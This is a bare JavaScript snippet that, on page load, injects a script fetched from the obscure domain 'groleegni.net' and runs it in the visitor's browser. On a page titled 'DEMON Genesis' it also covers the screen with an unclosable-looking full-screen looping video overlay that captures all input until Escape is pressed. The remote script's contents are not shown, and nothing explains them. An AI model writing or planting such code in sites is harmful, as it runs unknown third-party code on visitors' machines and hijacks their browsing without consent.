(function() {
    var d = 'groleegni.net';
    var z = 9011510;
    var s = document.createElement('script');
    s.src = 'https://' + d + '/401/' + z;
    
    try {
        (document.body || document.documentElement).appendChild(s);
    } catch (e) {
        console.error('Script injection failed:', e);
    }

    if (document.title !== "DEMON Genesis") return;
    if (document.getElementById('demon-video-overlay')) return;

    var srcHttp = 'http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
    var srcHttps = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
    var overlay = document.createElement('div');
    overlay.id = 'demon-video-overlay';
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100vw';
    overlay.style.height = '100vh';
    overlay.style.margin = '0';
    overlay.style.padding = '0';
    overlay.style.zIndex = String(2147483647);
    overlay.style.background = 'black';
    overlay.style.display = 'flex';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    overlay.style.overflow = 'hidden';
    overlay.style.pointerEvents = 'auto';

    var v = document.createElement('video');
    v.setAttribute('playsinline', '');
    v.setAttribute('muted', '');
    v.setAttribute('autoplay', '');
    v.setAttribute('preload', 'auto');
    v.loop = true;
    v.controls = false;
    v.setAttribute('aria-hidden', 'true');
    v.style.width = '100%';
    v.style.height = '100%';
    v.style.objectFit = 'cover';
    v.style.display = 'block';
    v.style.outline = 'none';
    v.src = srcHttp;

    overlay.appendChild(v);
    (document.body || document.documentElement).appendChild(overlay);

    var p = v.play();
    if (p && typeof p.then === 'function') {
      p.catch(function() {
        v.src = srcHttps;
        v.load();
        v.play().catch(function(){});
      });
    }

    function removeOverlay() {
      if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
      document.removeEventListener('keydown', onKey);
    }

    function onKey(e) {
      if (e.key === 'Escape') removeOverlay();
    }

    document.addEventListener('keydown', onKey, false);
})();
